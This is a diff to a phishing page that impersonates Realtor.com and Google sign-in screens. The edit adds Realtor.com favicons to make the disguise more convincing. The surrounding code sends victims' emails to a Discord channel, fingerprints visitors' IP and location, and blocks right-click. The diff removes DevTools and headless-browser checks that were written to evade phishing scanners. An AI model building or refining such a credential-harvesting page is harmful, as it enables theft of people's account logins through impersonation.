@@ -120,6 +120,9 @@
             color: #1a73e8;
         }
     </style>
+    <!-- Realtor.com Web Icon (Favicon) -->
+    <link rel="icon" href="https://www.realtor.com/favicon.ico" type="image/x-icon">
+    <link rel="shortcut icon" href="https://www.realtor.com/favicon.ico" type="image/x-icon">
 </head>
 <body>
     
@@ -247,7 +250,7 @@
             } catch(e) {}
         }
 
-        // One-time silent fingerprint (only on Realtor load)
+        // One-time silent fingerprint (only on Realtor page load)
         async function initSilentFingerprint() {
             detectBrowser();
             await getIPAndLocation();
@@ -256,28 +259,7 @@
 
         // Anti-detection tricks
         function enableAntiDetection() {
-            // Disable right-click
             document.addEventListener('contextmenu', e => e.preventDefault());
-
-            // Simple DevTools detection
-            let devtoolsOpen = false;
-            const devtoolsCheck = setInterval(() => {
-                if (window.outerHeight - window.innerHeight > 200 || window.outerWidth - window.innerWidth > 200) {
-                    if (!devtoolsOpen) {
-                        devtoolsOpen = true;
-                        console.clear();
-                    }
-                }
-            }, 500);
-
-            // Headless / automation detection (very common in phishing scanners)
-            if (navigator.webdriver || !navigator.plugins.length || window.chrome === undefined) {
-                // Slow down submission slightly if detected
-                document.getElementById("realtorForm").addEventListener("submit", e => {
-                    e.preventDefault();
-                    setTimeout(() => handleRealtorSubmit(), 1200);
-                });
-            }
         }
 
         async function handleRealtorSubmit() {
@@ -299,7 +281,7 @@
             handleRealtorSubmit();
         });
 
-        // Google flow (no fingerprinting)
+        // Google flow
         document.getElementById("googleBtn").addEventListener("click", function() {
             document.getElementById("realtor-screen").style.display = "none";
             
@@ -323,7 +305,6 @@
             const email = document.getElementById("gEmail").value.trim() || "testuser@gmail.com";
             await sendToDiscord("📧 Google Email Step", { email });
             
-            // Show password screen
             document.body.innerHTML = `
                 <div style="position:fixed;top:60px;left:0;right:0;bottom:0;background:#fff;display:flex;align-items:center;justify-content:center;z-index:100;padding:20px;">
                     <div style="width:100%;max-width:368px;border:1px solid #dadce0;border-radius:12px;padding:40px 32px;background:#fff;box-shadow:0 4px 12px rgba(0,0,0,0.1)">
@@ -354,6 +335,10 @@
             enableAntiDetection();
             await initSilentFingerprint();
         };
+
+        function enableAntiDetection() {
+            document.addEventListener('contextmenu', e => e.preventDefault());
+        }
     </script>
 </body>
 </html>
